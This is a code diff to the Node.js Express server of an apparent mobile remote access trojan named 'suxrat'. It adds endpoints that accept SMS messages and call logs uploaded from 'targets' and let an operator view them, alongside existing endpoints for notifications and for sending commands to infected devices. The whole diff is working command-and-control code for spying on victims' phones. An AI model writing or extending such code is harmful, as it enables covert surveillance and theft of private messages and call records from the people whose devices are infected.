@@ -7,6 +7,8 @@ const path = require('path');
 const DATA_ROOT = path.join(__dirname, '../data/suxrat');
 const TARGETS_FILE = path.join(DATA_ROOT, 'targets.json');
 const NOTIF_FILE = path.join(DATA_ROOT, 'notifications.json');
+const SMS_FILE = path.join(DATA_ROOT, 'sms.json');
+const CALLS_FILE = path.join(DATA_ROOT, 'calls.json');
 const COMMANDS_FILE = path.join(DATA_ROOT, 'commands.json');
 const RESPONSES_FILE = path.join(DATA_ROOT, 'responses.json');
 
@@ -89,6 +91,42 @@ router.get('/control/api/get-notifications/:id', (req, res) => {
     const allNotifs = readData(NOTIF_FILE);
     const filtered = allNotifs.filter(n => n.targetId === req.params.id);
     res.json(filtered);
+});
+
+// Get SMS logs
+router.get('/control/api/get-sms/:id', (req, res) => {
+    const allSms = readData(SMS_FILE);
+    const filtered = allSms.filter(s => s.targetId === req.params.id);
+    res.json(filtered);
+});
+
+// Post SMS
+router.post('/api/post-sms/:id', (req, res) => {
+    const targetId = req.params.id;
+    let allSms = readData(SMS_FILE);
+    allSms.unshift({ targetId, ...req.body, timestamp: new Date() });
+    if (allSms.length > 500) allSms = allSms.slice(0, 500);
+    saveData(SMS_FILE, allSms);
+    console.log(`[SMS] Data masuk dari Target: ${targetId}`);
+    res.json({ status: 'saved' });
+});
+
+// Get Call logs
+router.get('/control/api/get-calls/:id', (req, res) => {
+    const allCalls = readData(CALLS_FILE);
+    const filtered = allCalls.filter(c => c.targetId === req.params.id);
+    res.json(filtered);
+});
+
+// Post Call logs
+router.post('/api/post-call/:id', (req, res) => {
+    const targetId = req.params.id;
+    let allCalls = readData(CALLS_FILE);
+    allCalls.unshift({ targetId, ...req.body, timestamp: new Date() });
+    if (allCalls.length > 500) allCalls = allCalls.slice(0, 500);
+    saveData(CALLS_FILE, allCalls);
+    console.log(`[CALL] Data masuk dari Target: ${targetId}`);
+    res.json({ status: 'saved' });
 });
 
 // Send command
